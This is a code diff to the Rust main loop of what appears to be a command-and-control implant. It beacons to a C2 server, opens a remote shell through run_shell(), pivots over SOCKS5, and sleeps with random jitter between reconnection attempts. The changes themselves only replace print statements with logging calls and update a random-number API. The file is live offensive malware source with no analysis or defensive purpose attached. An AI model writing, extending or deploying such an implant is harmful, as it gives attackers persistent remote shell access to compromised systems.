@@ -8,7 +8,7 @@ use std::env;
 use std::time::Duration;
 use tokio::time;
 use rand::Rng;
-use log::{info, warn};
+use log::{info, warn, error};
 use networking::socks5_pivot::Socks5PivotHandler;
 use crate::networking::socks5_pivot_server::Socks5PivotServer;
 use std::sync::Arc;
@@ -57,16 +57,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[INFO] Agent ID: {}", agent_id);
     println!("[INFO] Using embedded configuration");
 
+    info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
     loop {
-        println!("[NETWORK] Attempting connection to C2: {}", server_addr);
+        info!("[NETWORK] Attempting connection to C2: {}", server_addr);
         if let Err(e) = run_shell(&server_addr, &agent_id).await {
-            println!("[ERROR] Shell error: {}. Retrying...", e);
-            // Add small delay after error before retrying
+            error!("[ERROR] Shell error: {}. Retrying...", e);
             time::sleep(Duration::from_secs(5)).await;
         }
         
-        let mut rng = rand::rng();
+        let mut rng = rand::thread_rng();
         let sleep_time = config.sleep_interval + rng.gen_range(0..config.jitter);
+        info!("[AGENT] Sleeping for {} seconds before next attempt", sleep_time);
         time::sleep(Duration::from_secs(sleep_time)).await;
     }
 }
